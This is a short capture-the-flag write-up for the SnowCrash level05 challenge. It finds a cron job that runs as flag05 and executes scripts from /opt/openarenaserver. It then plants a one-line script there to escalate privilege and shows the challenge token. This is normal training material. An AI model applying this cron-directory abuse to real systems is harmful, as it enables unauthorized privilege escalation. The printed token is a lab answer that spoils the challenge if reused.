when logging at this level (on the machine or via ssh but NOT when su - level05)
you have a "you have mail" prompt. checking it 

```bash
level05@SnowCrash:~$ echo $MAIL
/var/mail/level05
level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
so this seems like a cronjob every 2 minutes registered to flag05.
Checking that file we get
```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
so this is a simple bash script that runs all commands in open arena
/opt/openarenaserver directiory. Adding a simple getflag script
(and wall to see the output).

```bash
level05@SnowCrash:~$ echo 'getflag | wall' > /opt/openarenaserver/1
                                                                               
Broadcast Message from flag05@Snow                                             
        (somewhere) at 13:42 ...                                               
                                                                               
Check flag.Here is your token : viuaaale9huek52boumoomioc                      
```                                                           